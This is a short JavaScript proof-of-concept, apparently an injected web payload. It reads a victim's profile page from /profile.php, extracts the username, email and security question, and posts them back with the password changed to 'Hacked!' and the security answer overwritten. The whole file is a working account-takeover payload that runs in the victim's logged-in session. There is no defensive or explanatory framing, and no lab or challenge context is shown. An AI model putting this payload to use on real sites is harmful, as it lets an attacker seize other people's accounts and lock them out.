// This is a PoC
fetch('/profile.php').then(function (response) {
return response.text();
}).then(function (html) {
// This is the HTML from our response as a text string
const parser = new DOMParser();
    const pd = parser.parseFromString(html, "text/html");
    sq=pd.getElementById('security_question').value;
    sa=pd.getElementById('security_answer').value;
    email=pd.getElementById('email').value;
    username=pd.getElementById('username').value;
    
    data=new URLSearchParams({
        'username': username,
        'password': 'Hacked!',
        'email': email,
        'security_question': sq,
        'security_answer': 'Hax0red as well'
 });
    
    fetch('/profile.php', {
        method: 'POST', 
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'credentials': 'include'
        },
        body: data,
    }).then((response) => response)
      .then((data) => {
        console.log('Success changing password:', data);
      })
      .catch((error) => {
        console.error('Error:', error);
      })
}).catch(function (err) {
// There was an error
 console.warn('Something went wrong on GET profile.php.', err);
});
